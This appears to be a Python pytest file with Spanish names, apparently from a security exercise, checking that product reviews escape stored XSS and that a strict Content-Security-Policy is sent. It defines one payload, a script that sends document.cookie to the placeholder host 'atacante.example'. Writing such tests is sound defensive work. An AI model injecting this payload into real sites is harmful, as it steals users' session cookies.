"""A05 · XSS almacenado en las reseñas."""
from conftest import ANA

ATAQUE = "<script>fetch('https://atacante.example/?c='+document.cookie)</script>"


def test_resena_normal_se_ve(cliente):
    cliente.post("/productos/1/resenas", json={"texto": "Buen precio & entrega rápida"}, headers=ANA)
    html = cliente.get("/productos/1/resenas").get_data(as_text=True)
    assert "Buen precio &amp; entrega rápida" in html


def test_script_se_muestra_como_texto(cliente):
    cliente.post("/productos/1/resenas", json={"texto": ATAQUE}, headers=ANA)
    html = cliente.get("/productos/1/resenas").get_data(as_text=True)
    assert "<script>" not in html, "La reseña llegó al navegador como código"
    assert "&lt;script&gt;" in html


def test_csp_como_segunda_capa(cliente):
    r = cliente.get("/productos/1/resenas")
    csp = r.headers.get("Content-Security-Policy", "")
    assert "script-src" in csp or "default-src" in csp, "Falta Content-Security-Policy"
    assert "unsafe-inline" not in csp
